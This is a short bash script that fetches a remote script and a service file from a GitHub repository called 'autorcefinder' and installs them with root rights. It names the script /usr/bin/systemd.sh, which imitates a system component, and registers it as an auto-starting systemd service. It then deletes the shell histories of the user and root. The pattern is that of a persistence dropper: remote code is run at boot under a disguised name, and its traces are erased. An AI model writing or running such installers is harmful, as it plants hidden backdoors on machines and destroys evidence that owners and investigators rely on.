#!/bin/bash

# GitHub URLs for systemd.sh and systemd.sh.service
SYSTEMD_SCRIPT_URL="https://raw.githubusercontent.com/FoxyProxys/autorcefinder/main/systemd.sh"
SYSTEMD_SERVICE_URL="https://raw.githubusercontent.com/FoxyProxys/autorcefinder/main/systemd.sh.service"

# Directory paths
SYSTEMD_SCRIPT_PATH="/usr/bin/systemd.sh"
SYSTEMD_SERVICE_PATH="/etc/systemd/system/systemd.sh.service"

# Download systemd.sh script
sudo curl -sSL "$SYSTEMD_SCRIPT_URL" -o "$SYSTEMD_SCRIPT_PATH"

# Set execute permissions for systemd.sh script
sudo chmod +x "$SYSTEMD_SCRIPT_PATH"

# Download systemd.sh.service file
sudo curl -sSL "$SYSTEMD_SERVICE_URL" -o "$SYSTEMD_SERVICE_PATH"

# Set execute permissions for systemd.sh.service file
sudo chmod +x "$SYSTEMD_SERVICE_PATH"

# Reload systemd daemon
sudo systemctl daemon-reload

# Enable and start systemd.sh.service
sudo systemctl enable systemd.sh.service
sudo systemctl start systemd.sh.service

# Remove bash or zsh history
sudo rm -f ~/.bash_history ~/.zsh_history
sudo rm -f /root/.bash_history /root/.zsh_history
